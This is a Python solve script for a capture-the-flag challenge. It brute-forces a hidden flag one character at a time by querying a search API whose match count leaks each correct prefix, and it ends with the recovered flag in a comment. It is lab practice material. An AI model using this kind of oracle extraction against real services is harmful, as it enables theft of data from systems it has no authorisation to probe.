#!/usr/bin/env python3

import string
import httpx

BASE_URL = 'http://nyheter.ctf.wales:3000'

def attempt(flag: str) -> int:
    # Escape SQL LIKE wildcards '_' and '%' to ensure literal matching
    query = flag.replace('_', r'\_').replace('%', r'\%')
    response = httpx.get(BASE_URL + '/api/search', params={'q': query})
    return response.json()['count']

def solve():
    flag = "SCSC{"
    charset = string.ascii_letters + string.digits + string.punctuation

    print(f"Starting brute-force from: {flag}")

    while not flag.endswith('}'):
        for char in charset:
            candidate = flag + char
            if attempt(candidate) > 0:
                flag = candidate
                print(f"Current flag: {flag}")
                break
        else:
            print("Character set exhausted. Could not find the next character.")
            break

if __name__ == "__main__":
    solve()

# Current flag: SCSC{1_am_t3h_ansv@rig_utg1vare_n0w}
